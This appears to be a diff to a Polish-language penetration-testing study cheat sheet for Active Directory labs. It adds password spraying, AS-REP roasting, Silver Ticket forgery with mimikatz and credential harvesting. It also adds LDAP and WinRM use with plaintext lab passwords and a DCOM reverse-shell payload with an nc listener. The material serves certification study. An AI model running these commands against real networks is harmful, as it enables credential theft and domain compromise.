@@ -1410,6 +1410,7 @@ Z Kali / Linuxa:
 ```bash
 crackmapexec smb $DC -u users.txt -p 'Sezon2024!' -d $DOMAIN --continue-on-success   # nxc = następca cme; '(Pwn3d!)' = local admin!
 kerbrute passwordspray -d $DOMAIN users.txt 'Sezon2024!'          # przez Kerberos (2 pakiety UDP/próbę, najciszej)
+# ⚠️ Błąd sieciowy w kerbrute? users.txt musi być w kodowaniu ANSI (Notepad → Save As → Encoding: ANSI)
 ```
 Z hosta domenowego (Windows):
 ```powershell
@@ -1489,8 +1490,10 @@ impacket-secretsdump -just-dc $DOMAIN/user:password@$DC   # DCSync przez sieć (
 
 ## 5.3 Kerberos
 
+> 🧠 **Jak to działa (żeby wiedzieć, co atakujesz):** KDC siedzi na DC. Logowanie: **AS-REQ** (klient szyfruje timestamp swoim hashem) → **AS-REP** zwraca **TGT** (zaszyfrowany hashem konta **krbtgt** — klient go nie odczyta) + klucz sesji. Po dostęp do usługi: **TGS-REQ** (przedstaw TGT) → **TGS-REP** zwraca **bilet usługi** (zaszyfrowany hashem **konta usługi/SPN**). Stąd: **krbtgt hash → Golden Ticket** (fałszujesz dowolny TGT), **hash konta usługi → Silver Ticket** (fałszujesz bilet do tej usługi). TGT żyje ~10h. To dlatego AS-REP i Kerberoast dają hashe do łamania offline.
+
 ### AS-REP Roasting (Linux — patrz też §1.8)
-> Cel: konta z flagą `DONT_REQUIRE_PREAUTH` (UAC `0x410200`). Bez creds można samą listą userów; z creds `-request` bierze hash.
+> Cel: konta z flagą `DONT_REQUIRE_PREAUTH` (UAC `0x410200`). Bez creds można samą listą userów; z creds `-request` bierze hash. Na Windows wylistuj podatnych: `Get-DomainUser -PreauthNotRequired` (PowerView).
 ```bash
 impacket-GetNPUsers $DOMAIN/ -dc-ip $DC -usersfile users.txt -format hashcat -outputfile asrep.txt -no-pass
 impacket-GetNPUsers -dc-ip $DC -request -outputfile asrep.txt $DOMAIN/pete    # z poświadczeniami jednego usera
@@ -1615,9 +1618,23 @@ PsExec.exe \\dc1 cmd.exe                :: po NAZWIE hosta (nie IP!) → Kerbero
 > `/ptt` = wstrzyknij bilet od razu. ⚠️ Od lipca 2022 (KB5008380 / CVE-2021-42287) **musisz podać ISTNIEJĄCE konto** (`/user:jen`) — dawniej działała dowolna nazwa. Domyślnie bilet dostaje grupy 512/513/518/519/520.
 
 ### Silver Ticket (fałszywy TGS — jedna usługa, ciszej)
-> Potrzebne: hash konta **usługi** (np. konta komputera / SPN) + SID. Dostęp tylko do wskazanej usługi (`/service`), ale **bez ruchu do DC** → trudniejsze do wykrycia niż golden.
+> **Dlaczego działa:** usługa ufa grupom wpisanym w bilecie i (domyślnie) **nie waliduje PAC** u DC — więc podrobiony TGS z dowolnym członkostwem przechodzi bez ruchu do DC = trudny do wykrycia. Ważny na WSZYSTKIE serwery dzielące ten sam SPN/konto usługi.
+> Potrzebne 3 rzeczy: **hash konta usługi** (`/rc4:`) + **SID domeny** + **docelowy SPN**.
+```powershell
+# 1. SID domeny — obetnij ostatni RID (-XXXX) z wyniku:
+whoami /user
+# 2. hash konta usługi — z sekurlsa (usługa musi mieć sesję na hoście, gdzie jesteś adminem):
+#    mimikatz # sekurlsa::logonpasswords
+# 3. sprawdź dostęp PRZED (spodziewaj się 401):
+iwr -UseDefaultCredentials http://web04
+```
 ```
 mimikatz # kerberos::golden /user:jeffadmin /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /target:web04.corp.com /service:http /rc4:<hash_konta_uslugi> /ptt
+```
+```powershell
+# 4. weryfikacja PO — teraz 200 zamiast 401:
+klist
+iwr -UseDefaultCredentials http://web04
 ```
 
 ---
@@ -1718,7 +1735,18 @@ foreach ($g in $(LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Development 
 # Członkostwo usera — atrybut 'memberof':
 foreach ($o in $(LDAPSearch -LDAPQuery "(name=jeffadmin)")){ $o.properties.memberof }
 ```
-> Atrybuty warte czytania: `samaccountname`, `memberof`, `serviceprincipalname` (Kerberoast), `useraccountcontrol` (`DONT_REQ_PREAUTH` → AS-REP, `TRUSTED_FOR_DELEGATION` → delegacja), `pwdlastset`, `lastlogon`, `description` (często leżą tam hasła!), `operatingsystem`.
+> Atrybuty warte czytania: `samaccountname`, `memberof`, `serviceprincipalname` (Kerberoast), `useraccountcontrol` (`DONT_REQ_PREAUTH` → AS-REP, `TRUSTED_FOR_DELEGATION` → delegacja), `pwdlastset`+`lastlogon` (stare = **konto uśpione** = cichsze przejęcie + słabsze hasło sprzed zmiany polityki), `description` (często leżą tam hasła!), `operatingsystem`.
+
+> **Z hosta SPOZA domeny** (masz creds, ale nie jesteś zalogowany do domeny) — podaj poświadczenia wprost do `DirectoryEntry`:
+```powershell
+$user = 'corp\jen'
+$pass = 'Nexus123!'
+$LDAP = "LDAP://DC01.corp.com/DC=corp,DC=com"
+$directoryEntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP, $user, $pass)   # 3. arg = user, 4. = hasło
+$searcher = New-Object System.DirectoryServices.DirectorySearcher($directoryEntry, "(samAccountType=805306368)")
+$searcher.FindAll()
+```
+> ⚠️ **Ślepa plamka `net.exe`:** `net group "X" /domain` pokazuje tylko **userów** — pomija zagnieżdżone GRUPY i grupy Domain Local. Manualny LDAP (`objectclass=group`) / PowerView widzą wszystko → dlatego enumerujesz przez LDAP, nie tylko `net`.
 
 ### B. SPN — ręcznie (pod Kerberoasting, §5.3)
 ```cmd
@@ -1810,6 +1838,8 @@ impacket-mssqlclient Administrator:Lab123@$IP -windows-auth
 | **GenericWrite / WriteProperty** | zapis atrybutów | targeted Kerberoast (ustaw SPN) lub logon script |
 | **WriteDacl** | zapis ACL | dopisz sobie GenericAll → reset |
 | **WriteOwner** | zmiana właściciela | zostań ownerem → WriteDacl → GenericAll |
+| **AllExtendedRights** | wszystkie prawa rozszerzone | m.in. force-change-password, odczyt LAPS/gMSA |
+| **Self / Self-Membership** | dopisanie SIEBIE | dodaj się do grupy (nad którą masz Self) |
 | **AddMember (nad grupą)** | zapis `member` | dodaj się do uprzywilejowanej grupy |
 
 ### Krok 1 — enumeracja ACL (poprawnie: OBA wymiary)
@@ -2007,14 +2037,24 @@ impacket-smbexec $DOMAIN/user:password@$IP
 impacket-atexec $DOMAIN/user:password@$IP whoami    # przez scheduled task
 ```
 
-### PowerShell Remoting (5985/5986, WinRM z poświadczeniami)
+### PowerShell Remoting (5985/5986, wbudowany WinRM z poświadczeniami)
+> To wbudowana funkcja WinRM w PowerShellu — wywołujesz `New-PSSession`, podając IP celu i **obiekt poświadczeń** (`PSCredential`). Zbuduj go krok po kroku:
 ```powershell
-$cred = New-Object System.Management.Automation.PSCredential('corp\jen',(ConvertTo-SecureString 'Nexus123!' -AsPlainText -Force))
-Enter-PSSession -ComputerName 192.168.50.73 -Credential $cred          # sesja interaktywna
-$sess = New-PSSession -ComputerName 192.168.50.73 -Credential $cred
-Invoke-Command -Session $sess -ScriptBlock { hostname; whoami }        # zdalne polecenie
-Invoke-Command -ComputerName files04 -Credential $cred -ScriptBlock { whoami }
+$username = 'jen'
+$password = 'Nexus123!'
+$secureString = ConvertTo-SecureString $password -AsPlaintext -Force
+$credential = New-Object System.Management.Automation.PSCredential $username, $secureString
+New-PSSession -ComputerName 192.168.50.73 -Credential $credential      # zwraca Id sesji (State: Opened)
+Enter-PSSession 1                                                       # wejdź do sesji po Id
+whoami; hostname                                                        # weryfikacja w sesji
 ```
+Nieinteraktywnie (jedno polecenie / wiele hostów):
+```powershell
+$sess = New-PSSession -ComputerName 192.168.50.73 -Credential $credential
+Invoke-Command -Session $sess -ScriptBlock { hostname; whoami }
+Invoke-Command -ComputerName files04 -Credential $credential -ScriptBlock { whoami }
+```
+> Wymaga: user w grupie **Administrators** lub **Remote Management Users** na celu. Ten sam `$credential` reużywasz do WMI/CIM (§7.1 wyżej) i winrs.
 ### winrs (natywny klient WinRM, cmd)
 ```cmd
 winrs -r:files04 -u:jen -p:Nexus123! "cmd /c hostname & whoami"
@@ -2026,7 +2066,10 @@ winrs -r:files04 -u:jen -p:Nexus123! "powershell -nop -w hidden -e JABjAGwAaQBlA
 ```powershell
 # a) MMC20.Application — wykonaj polecenie zdalnie (bez podawania creds, użyje Twojego tokenu):
 $dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))
+# 1. Test, że działa (na celu: tasklist | findstr calc):
 $dcom.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c calc.exe","7")
+# 2. REVERSE SHELL — dostaw payload base64 (koder §7.1); listener nc -lvnp 443 PRZED:
+$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"-nop -w hidden -e JABjAGwAaQBlAG4...","7")
 # b) CIM/DCOM Win32_Process Create (z creds — patrz $cred wyżej):
 $Opt = New-CimSessionOption -Protocol DCOM
 $Session = New-CimSession -ComputerName 192.168.50.73 -Credential $cred -SessionOption $Opt
